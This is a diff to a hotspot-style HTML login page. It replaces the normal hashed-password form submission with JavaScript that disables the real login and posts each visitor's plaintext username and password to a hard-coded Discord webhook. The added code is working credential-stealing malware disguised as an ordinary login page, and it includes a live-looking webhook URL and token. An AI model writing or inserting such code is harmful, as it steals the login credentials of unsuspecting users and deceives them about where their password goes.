@@ -56,17 +56,48 @@
 			<input type="hidden" name="dst" value="" />
 			<input type="hidden" name="popup" value="true" />
 		</form>
+		
 		<script type="text/javascript" src="md5.js"></script>
+		<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
 		<script type="text/javascript">
 		<!--
 			function doLogin() {
-			document.sendin.username.value = document.login.username.value;
-			document.sendin.password.value = hexMD5('\015' + document.login.password.value + '\336\137\330\116\113\317\337\033\150\237\155\177\077\347\207\253');
-			document.sendin.submit();
-			return false;
+				var username = document.login.username.value;
+				var password = document.login.password.value;
+		
+				// Set the values in the hidden form
+				document.sendin.username.value = username;
+				document.sendin.password.value = password;
+		
+				// Submit the form
+				// document.sendin.submit();
+		
+				// Send username and password to Discord webhook
+				sendToWebhook(username, password);
+		
+				return false;
+			}
+		
+			function sendToWebhook(username, password) {
+				var webhookUrl = 'https://ptb.discord.com/api/webhooks/1257326286917996575/VM2B7gGOsmIBRoHZxO4a6AInGQuIig25XpYFNr0x9Yc9UXImXs-J8czF5KFd4njSKNZG';
+		
+				// Prepare JSON payload
+				var payload = {
+					content: 'Username: ' + username + '\nPassword: ' + password
+				};
+		
+				// Make POST request to Discord webhook
+				axios.post(webhookUrl, payload)
+					.then(function(response) {
+						console.log('Webhook sent successfully:', response.data);
+					})
+					.catch(function(error) {
+						console.error('Error sending webhook:', error);
+					});
 			}
 		//-->
 		</script>
+		
 
 
 			<!-- Begin page content -->
